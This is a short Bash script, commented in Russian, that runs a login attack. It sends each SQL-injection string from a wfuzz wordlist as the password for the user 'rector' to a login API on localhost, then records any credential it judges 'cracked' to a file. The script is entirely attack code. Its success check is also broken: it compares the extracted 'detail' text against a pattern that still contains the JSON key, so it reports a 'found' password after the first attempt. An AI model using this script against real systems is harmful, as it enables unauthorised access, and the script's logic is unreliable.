#!/bin/bash

# Файл с паролями
password_file="/usr/share/wordlists/wfuzz/Injections/SQL.txt"

output_file="cracked_users.txt"

# Имя пользователя для атаки
username="rector"  # Замените на нужное имя пользователя

# Цикл по строкам файла с паролями
while IFS= read -r password; do
  # Отправляем POST-запрос с текущим паролем 
  response=$(curl -sk -X POST \
    'http://127.0.0.1:8000/login' \
    -H 'accept: application/json' \
    -H 'Content-Type: application/json' \
    -d "{\"username\": \"$username\", \"password\": \"$password\"}" \
    | jq -r '.detail')

  echo "Проверка пользователя: $username с паролем: $password"
  echo "Ответ сервера: $response"
  echo "-------------------------------"

  # Проверяем, есть ли в ответе ошибка "неверный пароль"
  if [[ "$response" != *'"detail":"неверный пароль"'* ]]; then
      echo "Пароль найден для пользователя $username: $password"
      echo "Ответ сервера: $response"

      echo "Пользователь: $username, Пароль: $password" >> "$output_file"

      break  # Останавливаем атаку после успешной авторизации
  fi
done < "$password_file"

echo "Атака завершена."
exit 1
